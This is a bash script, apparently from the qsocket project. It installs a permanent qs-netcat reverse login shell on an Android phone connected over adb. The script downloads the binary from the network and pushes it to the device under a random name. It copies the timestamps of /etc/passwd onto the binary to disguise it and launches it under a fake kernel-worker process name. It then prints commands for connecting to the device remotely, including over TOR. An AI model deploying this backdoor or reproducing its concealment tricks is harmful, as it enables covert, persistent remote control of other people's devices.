#!/usr/bin/env bash

# Install and start a permanent qs-netcat reverse login shell
#
# See https://qsocket.io/deploy/ for examples.
#
# This script is typically invoked like this as root or non-root user:
#   $ bash -c "$(curl -fsSL qsocket.io/x)"
#
# Pre-set a secret:
#   $ S=MySecret bash -c "$(curl -fsSL qsocket.io/x)"
#
# Steps taken:
# 1. Download and unpack Qsocket android utility
# 2. Check availible (connected) android devices with adb 
# 3. Push the Qsocket binary nuder /data/local/tmp/
#   - Check if the binary is working properly
# 4. Execute Qsocket binary with nohup inside the android device.

# Other variables:
# QS_DEBUG=1 -> Verbose output.
print_banner() {
	local banner="ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8gIElOID4gICAgICAgICAgICAgICAgICAgICAgICAgICItXyAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvICAgICAgLiAgfCAgLiAgICDjg73gvLzguojZhM2c4LqI4Ly9KSk+PS0gICAgICAgXCAgICAgICAgICAKICAg4Ly844Gk4LKg55uK4LKg4Ly944GkIOKUgD3iiaHOo08pKSAgIF8gICAgICAgIF8gICAgICAgLyAgICAgIDogXCB8IC8gOiAgICAgICAgICAgICAgICAgICAgICAgXCAgICAgICAgIAogICBfXyBfIF9fXyAgX19fICAgX19ffCB8IF9fX19ffCB8XyAgICAvICAgICAgICAnLV9fXy0nICAgICAgICAgIOKYnCjinY3htKXinY3KiykpPi0gICAgXCAgICAgIAogIC8gX2AgLyBfX3wvIF8gXCAvIF9ffCB8LyAvIF8gXCBfX3wgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXyBcICAgICAgCiB8IChffCBcX18gXCAoXykgfCAoX198ICAgPCAgX18vIHxfICAgICAgICBfX19fX19ffCB8X19fX19fX19fX19fX19fX19fX19fX19fLS0iIi1MIAogIFxfXywgfF9fXy9cX19fLyBcX19ffF98XF9cX19ffFxfX3wgICAgICAvICAgICAgIEYgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwgCiAgICAgfF98ICAgQ29weXJpZ2h0IChjKSAyMDIyIFFzb2NrZXQgICAgLyAgICAgICBGICAgSiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTAogIGh0dHBzOi8vZ2l0aHViLmNvbS9xc29ja2V0LyAgICAgICAgICAgLyAgICAgIDonICAgICAnOiAgIOKUgD3iiaHOoygoKCDjgaTil5XZhM2c4peVKeOBpCAgICAgICAgIEYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLyAgT1VUIDwgJy1fX18tJyAgICAgICAgICAgICAgICAgICAgICAgICAgICAvIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC9fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fXy0tIgoK"
	cat <<__BANNER__
                                           __________________________________         
                                          /  IN >                            "=-_         
                                         /      .  |  .    ヽ༼ຈل͜ຈ༽))>=-          7.          
   ༼つಠ益ಠ༽つ ─=≡ΣO))   _        _      /      : \\ | / :                           \\.        
   __ _ ___  ___   ___| | _____| |_    /        '-___-'          ☜(❍ᴥ❍ʋ))>-         \\.      
  / _  / __|/ _ \\ / __| |/ / _ \\ __|  /_________________________________________,    \\.      
 | (_| \\__ \\ (_) | (__|   <  __/ |_        _______| |___________________________).x.  ) 
  \\__, |___/\\___/ \\___|_|\\_\\___|\\__|      /       F J                                 : 
     |_|   Copyright (c) 2023 Qsocket    /       F   J                               /.
  https://github.com/qsocket/           /      :'     ':   ─=≡Σ((( つ◕ل͜◕)つ         /.
                                       /  OUT < '-___-'                            z. 
                                      /_________________________________________--"

__BANNER__
}

[[ -z $ERR_LOG ]] && ERR_LOG="/dev/null"
## ANSI Colors (FG & BG)
RED="$(printf '\033[31m')" GREEN="$(printf '\033[32m')" YELLOW="$(printf '\033[33m')" BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')" CYAN="$(printf '\033[36m')" WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')" GREENBG="$(printf '\033[42m')" YELLOWBG="$(printf '\033[43m')" BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')" CYANBG="$(printf '\033[46m')" WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESET="$(printf '\e[0m')"

print_status() {
    echo -n ${YELLOW}"[*] ${RESET}"
    echo $1
}

print_progress() {
	[[ ! -z "${VERBOSE}" ]] && return
    echo -n ${YELLOW}"[*] ${RESET}${1}"
	n=${#1}
	printf %$((70-$n))s |tr " " "."
}

print_warning() {
  echo ${YELLOW}"[!] ${RESET}${1}"
}

print_error() {
  echo ${RED}"[-] ${RESET}${1}" 
}

print_fatal() {
  echo -e ${RED}"[!] $1\n${RESET}"
  kill -10 $$
}

print_good() {
  echo ${GREEN}"[+] ${RESET}${1}"
}

print_verbose() {
  if [[ ! -z "${VERBOSE}" ]]; then
    echo -n ${WHITE}"[*] ${RESET}${1}"
  fi
}

print_ok(){
	[[ -z "${VERBOSE}" ]] && echo -e " [${GREEN}OK${RESET}]"
}

print_fail(){
	[[ -z "${VERBOSE}" ]] && echo -e " [${RED}FAIL${RESET}]"
}

read_input() {
    export SELECTION=""
    echo -n ${YELLOW}"[>] ${RESET}${1}" >&2
    read SELECTION
  # SELECTION=$(echo -n $SELECTION|tr -d '\n\r')
}

must_exist() {
  for i in "$@"; do
		command -v $i >$ERR_LOG || print_fatal "$i not installed! Exiting..."
  done
}

one_must_exist() {
	command -v $1 >$ERR_LOG || command -v $2 >$ERR_LOG || print_fatal "Neither $1 nor $2 installed! Exiting..."
}

## Handle SININT
exit_on_signal_SIGINT () {
	print_error "Script interrupted!"
  	clean_exit
}

exit_on_signal_SIGTERM () {
	print_error "Script interrupted!"
	clean_exit
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM


# Remove all artifacts and exit...
clean_exit() {
	[[ -f "$QS_PATH" ]] && rm -rf "`dirname $QS_PATH`" &>$ERR_LOG
    kill -10 $$
}


get_latest_release_url() {
	# For testing
	[[ -z "$QS_UTIL" ]] && print_fatal "Binary name not set! Exiting..."
	local API_URL="$BASE_URL/$QS_UTIL/releases/latest"
	WGET_BIN=$(command -v wget)
	CURL_BIN=$(command -v curl)
	[[ ! -z $CURL_BIN ]] && curl -s "$API_URL" -o- | grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
	[[ ! -z $WGET_BIN ]] && wget -q -O- "$API_URL"|grep -E "/releases/download/.+${OS_NAME}_${OS_ARCH}\.tar\.gz"|cut -d'"' -f4 && return
}

# Download the latest release of the qsocket util to the given directory.
# $1 = DOWNLOAD_PATH
download_util() {
	local ACCEPT_HEADER="Accept: application/octet-stream"
	DOWNLOAD_URL=$(get_latest_release_url)
	[[ -z $DOWNLOAD_URL ]] && print_fatal "Failed fetching latest release URL"
	print_verbose "Downloading: $DOWNLOAD_URL -> $1"
	WGET_BIN=$(command -v wget)
	CURL_BIN=$(command -v curl)
	[[ ! -z $CURL_BIN ]] && curl -s -k -L -H "$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>$ERR_LOG && return 0
	[[ ! -z $WGET_BIN ]] && wget -q --no-check-certificate --header="$ACCEPT_HEADER" "$DOWNLOAD_URL" -o "$1" &>$ERR_LOG && return 0
	print_verbose "All download methods failed!"
	return 1
}

# Unpack the given qs-util to the same directory with given name
# $1 = archive file 
unpack_util() {
	local TDIR="`dirname $1`"
	tar -C "$TDIR" -xzf "$1" &>$ERR_LOG || return 1
	[[ -f "$TDIR/$QS_UTIL" ]] || return 1
	#  "$TDIR/$QS_UTIL" "$2" &>$ERR_LOG || return 1
	chmod +x "$TDIR/$QS_UTIL" &>$ERR_LOG || return 1
	touch -r "/etc/passwd" "$TDIR/$QS_UTIL" &>$ERR_LOG
	touch -r "/etc" "$TDIR" &>$ERR_LOG 
	return 0
}

print_usage() {
	echo -e -n "\n"
	echo -n ${BLUE} "# >>> Connect ============> ${RESET}" 
	echo "qs-netcat -i -s $S"	
	echo -n ${BLUE} "# >>> Connect With TOR ===> ${RESET}"
	echo "qs-netcat -T -i -s $S"	
	# echo -n ${BLUE} "# >>> Uninstall ==========> "
	# echo "QS_UNDO=1 bash -c \"\$(curl -fsSL qsocket.io/x)\""
	echo -e "\n"
}


# Detects the OS architecture of the connected android device 
# with the given device name
# detect_android_arch <$DEVICE_NAME>
detect_android_arch() {
    local arch=$(adb -s $1 shell "uname -m")
	case $arch in
		"x86_64")
			echo -n "amd64"
			;;
		"i686"|"i386")
			echo -n "386"
			;;
		"aarch64")
			echo -n "arm64"
			;;
		*)
			print_fatal "Unsupported OS architecture! Exiting..."
			;;
	esac
}

list_devices() {
    echo ""
    i=1
    while IFS='' read -r line || [[ -n "$line" ]]; do
        echo -n -e "${CYAN}[$i] ${RESET}${line}"
        ((i+=1))
    done < <(adb devices|grep "device$")
	[[ $i -eq 1 ]] && print_fatal "No deviced found! Connect an android device or enable USB debugging..."
    echo -e "\n"
}

exec_hidden() {
    adb -s $DEVICE_NAME shell -x "sh -T- -c \"QS_ARGS='-l -i -q -s $S' exec -a '$PROC_HIDDEN_NAME' $1\"" &>$ERR_LOG 
}



###########################
########## START ##########
###########################
must_exist "printf" "tar" "gzip" "adb" "grep" "cut" "tr" "touch" "mktemp"
one_must_exist "curl" "wget"
print_banner

#
# -- Init global vars --
#
# Verbose error logs
[[ ! -z $VERBOSE ]] && ERR_LOG="`tty`"

QS_UTIL="qs-netcat" # Change this!!
RAND_NAME=$(tr -dc a-z0-9 </dev/urandom | head -c 15)
BASE_URL="https://api.github.com/repos/qsocket"
PROC_HIDDEN_NAME="[kworker/0:0-events]"  # "[kworker/0:0-events]"
QS_PATH="/data/local/tmp"
WORKDIR=$(mktemp -d)
## -- START --
print_status "Binary: $QS_UTIL"
print_status "Listing available android devices..."
list_devices
read_input "Type device number: "
DEVICE_NAME=$(adb devices|grep "device$"|awk "NR==$SELECTION"|awk '{print $1}')
print_status "Selected device: $DEVICE_NAME"
OS_ARCH=$(detect_android_arch $DEVICE_NAME)

echo "" ## --- break after device selection
print_progress "Downloading latest $QS_UTIL binary for android ($OS_ARCH)"
download_util "$WORKDIR/qs.tar.gz" && print_ok || (print_fail && print_fatal "$QS_UTIL download failed! Exiting...")
print_progress "Unpacking binaries"
unpack_util "$WORKDIR/qs.tar.gz" && print_ok || (print_fail && print_fatal "Archive unpacking failed! Exiting...")
print_progress "Pushing Qsocket utils to device"
adb -s $DEVICE_NAME push "$WORKDIR/$QS_UTIL" "$QS_PATH/$RAND_NAME" &>$ERR_LOG  && print_ok || (print_fail && print_fatal "Unable to push to device! Exiting...")
print_progress "Testing binaries"
adb -s $DEVICE_NAME shell "$QS_PATH/$RAND_NAME -h" &>$ERR_LOG  && print_ok || (print_fail && print_fatal "Binary execution tests failed! Exiting...")
[[ -z "$S" ]] && S=$(adb -s $DEVICE_NAME shell "$QS_PATH/$RAND_NAME -g") # Generate random secret if not passed.
print_progress "Triggering initial execution"
exec_hidden "$QS_PATH/$RAND_NAME" && print_ok || (print_fail && print_fatal "Execution failed! Exiting...")
print_usage